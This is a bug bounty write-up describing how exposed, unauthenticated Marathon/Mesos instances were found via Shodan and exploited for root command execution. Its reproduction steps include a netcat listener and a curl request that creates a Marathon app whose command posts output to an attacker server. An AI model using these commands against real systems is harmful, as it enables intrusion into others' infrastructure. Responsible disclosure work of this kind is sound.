---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-08-27_private-bug-bounty-usd-rce-as-root-on-marathon-mesos-instance.md
original_filename: 2019-08-27_private-bug-bounty-usd-rce-as-root-on-marathon-mesos-instance.md
title: 'Private bug bounty $$,$$$ USD: “RCE as root on Marathon-Mesos instance”'
category: documents
detected_topics:
- xss
- command-injection
- path-traversal
tags:
- imported
- documents
- xss
- command-injection
- path-traversal
language: en
raw_sha256: 4f5ac52fc259de61634e023d49308592d95c50b1c6a1e8d2f135cdec290ab41c
text_sha256: e6d4ea23369da8992776e11efcc561a2553d2addaabd486e46063e572ff5790a
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Private bug bounty $$,$$$ USD: “RCE as root on Marathon-Mesos instance”

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-08-27_private-bug-bounty-usd-rce-as-root-on-marathon-mesos-instance.md
- Source Type: markdown
- Detected Topics: xss, command-injection, path-traversal
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `4f5ac52fc259de61634e023d49308592d95c50b1c6a1e8d2f135cdec290ab41c`
- Text SHA256: `e6d4ea23369da8992776e11efcc561a2553d2addaabd486e46063e572ff5790a`


## Content

---
title: "Private bug bounty $$,$$$ USD: “RCE as root on Marathon-Mesos instance”"
page_title: "PRIVATE BUG BOUNTY – RCE AS ROOT ON MARATHON-MESOS INSTANCE – $$,$$$ USD – @omespino"
url: "https://omespino.com/write-up-private-bug-bounty-usd-rce-as-root-on-marathon-instance/"
final_url: "https://omespino.com/write-up-private-bug-bounty-usd-rce-as-root-on-marathon-instance/"
authors: ["Omar Espino (@omespino)"]
bugs: ["RCE"]
publication_date: "2019-08-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5060
---

WEB$$,$$$ USD[August 2019](/write-up-private-bug-bounty-usd-rce-as-root-on-marathon-instance/)

# PRIVATE BUG BOUNTY – RCE AS ROOT ON MARATHON-MESOS INSTANCE – $$,$$$ USD

**Introduction**  
Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about why your professional background mather when you do bug bounties (in my case my job as DevOps engineer) if you know how something works, you might be able to break it. 

**Report Summary**

Hi team I i’ve found that some of your Marathon intances are vulnerablte to RCE as root

**Description and impact:**

Marathon is a production-grade container orchestration platform for Mesosphere’s [Datacenter Operating System (DC/OS)](https://dcos.io/) and [Apache Mesos](https://mesos.apache.org/).  
So, since Marathon is a orchestration platform for mesos, that means that you can schedule tasks to be performed whatever you want, per example a simple bash command (pretty similar to cronjobs)****  

**Steps To Reproduce:**

One day I just was navigating in shodan and I don’t know why I thought about the Marathon service (As DevOps engineer, in one of my activities I needed to set up some Marathon/Mesos/Spark instances), that made me think about which companies have Marathon instances activated without any authentication in production environments, so I decided to try with some dorks in[ shodan](http://shodan.io/) (like “SSL: Redacted” “X-Marathon-Leader”) when suddenly some wild server appear:

[![](/assets/images/2019/08/marathon-shodan-2-1024x594.webp)](/assets/images/2019/08/marathon-shodan-2.webp)

I thought WOW! Marathon instances with HTTP/1.1 200 OK responses, it is not a guarantee, but 90% of the times, a 200 response on Marathon UI means that you have access without any kind of authentication needed 

**Extracted from the report:**

Hi Sec team here is the POC

1.- Go to https://XXX.XXX.XXX.XXX/ui/#/apps and see the Marathon’s Dashboard and the application list (without any authentication needed):

[![](/assets/images/2019/08/marathon-ui-apps-1024x370.webp)](/assets/images/2019/08/marathon-ui-apps.webp)

2.- then set your own server listening with netcat with the following command: 
  
  
  #set your own server to wait the response
  root@h0st:~# **nc -lvvv 55555**

3.- then create a Marathon application that will be execute the RCE command with the following curl command: 
  
  
  # create a marathon application that will be execute any command that you want (in this case is /usr/bin/wget --user-agent=marathon-id --post-data=`id`)
  # replace attacker_server with your listening server that you set up with netcat and the "rce-id" tag with your own custom tag, this is the Marathon application name
  root@h0st:~# **curl -sk -X POST -H "Content-type: application/json" https://XXX.XXX.XXX.XXX/v2/apps -d '{ "mem": 16, "id": "rce-id", "cmd": "/usr/bin/wget --user-agent=marathon-id --post-data=`id` attacker_server:55555"}'**

4.- Then go to https://XXX.XXX.XXX.XXX/ui/#/apps again and see the application created named “rce-id” that we just created with curl, and wait some seconds and recieve the command from the Marathon Instance and the command output

[![](/assets/images/2019/08/marathon_rce-1024x541.webp)](/assets/images/2019/08/marathon_rce.webp)

PS. after that I deleted immediately the rce-id aplication from Marathon UI

Tools:netcat, curl and any browser

Is this bug public or known by third parties?No

Can I reproduce this issue every time?Yes

How did I find this bug? via shodan.

well that’s it, if you have any doubt, comment or sugestion just drop me a line here or in twitter [@omespino](https://twitter.com/omespino), read you later.

[](/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/)

[](/write-up-google-bug-bounty-lfi-on-production-servers-in-redacted-google-com-13337-usd/)
